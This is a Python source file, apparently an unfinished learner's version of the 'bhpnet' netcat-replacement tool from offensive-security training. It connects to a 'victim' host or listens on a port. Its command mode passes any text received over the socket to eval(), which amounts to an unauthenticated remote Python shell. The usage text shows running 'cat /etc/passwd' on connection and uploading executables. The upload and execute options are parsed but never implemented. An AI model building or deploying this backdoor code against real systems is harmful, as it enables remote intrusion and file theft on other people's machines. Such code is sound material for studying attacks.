import threading
import sys
import socket
import getopt


# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
port = 9999
upload_destination = ""


def usage():
    print("Netcat Replacement")
    print("Usage: nc.py -t target_host:port")
    print(
        "-l --listen                - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   - execute the given file upon receiving a connection")
    print("-c --command               - initialize a python interactive shell")
    print(
        "-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


if not len(sys.argv[1:]):
    usage()

# read the commandline options
try:
    opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", [
                               "help", "listen", "execute", "target", "port", "command", "upload"])
except getopt.GetoptError as err:
    print(str(err))
    usage()

# analyze the options and their corresponding arguments
for o, a in opts:
    if o in ("-h", "--help"):
        usage()
    elif o in ("-l", "--listen"):
        listen = True
    elif o in ("-e", "--execute"):
        execute = a
    elif o in ("-c", "--commandshell"):
        command = True
    elif o in ("-u", "--upload"):
        upload_destination = a.strip()
    elif o in ("-t", "--target"):
        target = a.strip()
    elif o in ("-p", "--port"):
        port = int(a)
    else:
        assert False, "Unhandled Option"


# Feature to connect to victim
def client_sender(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    print("[*]Successfully connected to {}:{}".format(target, port))
    s.send(buffer)


# are we going to listen or just send data from stdin
if not listen and len(target) and port > 0:

    # read in the buffer from the commandline
    # this will block, so send CTRL-D if not sending input
    # to stdin
    buffer = sys.stdin.read()
    buffer = buffer.encode('utf8')
    # send data off
    client_sender(buffer)


def server_loop():
    server_socket = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM)  # the socket of server
    server_socket.bind((target, port))
    server_socket.listen(5)
    print("[*]Listening on {}:{}".format(target, port))

    # handle clients
    def handle_client(client_socket):
        if command:
            while True:
                cmd = client_socket.recv(4096)  # receive data
                cmd = cmd.decode('utf8')
                eval(cmd)  # eval Python statements

    while True:
        client_socket, client_addr = server_socket.accept()
        print("[*]Accepted connection from {}:{}".format(*client_addr))
        client_thread = threading.Thread(
            target=handle_client, args=(client_socket,))
        client_thread.start()


# we are going to listen and potentially
# upload things, execute commands and drop a shell back
# depending on our command line options above
if listen:
    server_loop()
